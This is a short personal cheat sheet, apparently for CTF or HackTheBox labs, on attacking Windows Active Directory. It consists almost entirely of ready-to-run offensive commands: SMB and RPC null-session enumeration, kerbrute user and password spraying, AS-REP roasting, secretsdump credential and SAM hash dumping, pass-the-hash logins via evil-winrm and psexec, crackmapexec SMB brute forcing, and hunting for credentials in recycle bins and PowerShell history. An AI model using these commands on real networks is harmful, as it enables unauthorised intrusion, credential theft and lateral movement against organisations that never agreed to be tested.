# Active Directory? What to do?

**Adjust each command with the correct condition**

## list shares
`smbclient -L //[IP]`

## try anonymous login
`smbclient -N //[IP]/[sharename]`

## try null authentication
`smclient -U '' -N //[IP]/sharename`

## try with rpcclient (when got in just google rpcclient commands)
`rpcclient [ip]`

## try with rpcclient with null authentication
`rpcclient -U '' -N [IP]`

## enum more with enum4linux
`enum4linux -a [IP]`

## spray username or password with kerbrute
`~/scripts/kerbrute userenum --dc [IP] -d [domain-name] [user_list]`
`~/scripts/kerbrute bruteuser --dc [IP] -d [domain-name] [password_list] [username]`

## ASREPRoasting with GetNPUsers.py
`python3 ~/scripts/impacket/examples/GetNPUsers.py -dc-ip [IP] [domain-name]/[user] -no-pass`
and crack it

## login to smbclient if you have creds
`smbclient -L //[IP] --user=[user] --password [password]`

## access shares if you have creds
`smbclient //[IP]/[sharename] --user=[user]`

## enum basic info with rpcclient
`rpcclient [domain-name] -U [username]`
> enumdomusers
> enumdomgroups

## try to dump secrets of you have creds
`python3 ~/scripts/impacket/examples/secretsdump.py -target-ip [IP] [domain-name]/[full-username] -outputfile secretsdump.log`
or
`python3 ~/scripts/impacket/examples/secretsdump.py [options you want] [user]:[password]@[IP]`

## got NTLM hash? got password? got user? evil-winrm time
`evil-winrm -i [IP] -u [user] -H [NT hash]`
or just use the password if you got one

or just psexec
`python3 ~/scripts/impacket/examples/psexec.py [username]@[ip_address]`


## Try Bruteforce SMB with crackmapexec
`crackmapexec smb <MACHINE-IP> -u <username> -p <wordlist>`
ex: `crackmapexec smb 10.10.153.204 -u Jareth -p ~/wordlists/rockyou.txt`


## Dumping LM and NTLM when we have system.bak and sam.bak
`python3 ~/scripts/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL -outputfile hashes.txt`

## How to find SID
`whoami /all | Select-String -Pattern "[username]" -Context 2,0`

## Always check recycle bin (Even via commandline)
cd 'C:\$Recycle.bin\<SID>'
ex:
cd 'C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001'

## Check the powershell history (Ini ada di semua windows)
C:\Users\[username]\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

## Certify Privesc
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin)
- If can't, try PassTheCertificate (check your HTB Authority Medium)